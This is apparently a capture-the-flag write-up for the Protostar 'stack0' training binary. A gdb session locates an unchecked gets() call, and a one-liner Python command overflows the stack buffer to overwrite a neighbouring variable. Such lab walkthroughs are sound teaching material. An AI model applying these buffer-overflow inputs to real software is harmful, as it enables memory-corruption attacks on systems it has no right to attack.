```
TL;DR -> python -c "print 'A'*(4 + 16*3 + 14)" | ./stack0
```

# Writeup

When we run the binary, it is asking for input

```
user@protostar:/opt/protostar/bin$ gdb stack0
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack0...done.
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x080483f4 <main+0>:    push   ebp
0x080483f5 <main+1>:    mov    ebp,esp
0x080483f7 <main+3>:    and    esp,0xfffffff0
0x080483fa <main+6>:    sub    esp,0x60
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave
0x08048434 <main+64>:   ret
End of assembler dump.
(gdb) break *0x0804840c
Breakpoint 1 at 0x804840c: file stack0/stack0.c, line 11.
(gdb) break *0x08048411
Breakpoint 2 at 0x8048411: file stack0/stack0.c, line 13.
(gdb) r
Starting program: /opt/protostar/bin/stack0

Breakpoint 1, 0x0804840c in main (argc=1, argv=0xbffff864) at stack0/stack0.c:11
11      stack0/stack0.c: No such file or directory.
        in stack0/stack0.c
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAA

Breakpoint 2, main (argc=1, argv=0xbffff864) at stack0/stack0.c:13
13      in stack0/stack0.c
(gdb) x/24wx $esp
0xbffff750:     0xbffff76c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff760:     0xb7fd7ff4      0xb7ec6165      0xbffff778      0x41414141
0xbffff770:     0x41414141      0x41414141      0x41414141      0x08004141
0xbffff780:     0xb7ff1040      0x08049620      0xbffff7b8      0x08048469
0xbffff790:     0xb7fd8304      0xb7fd7ff4      0x08048450      0xbffff7b8
0xbffff7a0:     0xb7ec6365      0xb7ff1040      0x0804845b      0x00000000
(gdb)
```

As we can see `0x41414141` and `0x00000000`, there are total `4 + (4*4)*3 + (4*3 + 2)` bytes

---

One liner solution:

`python -c "print 'A' * (4 + (4*4)*3 + (4*3 + 2))" | ./stack0`
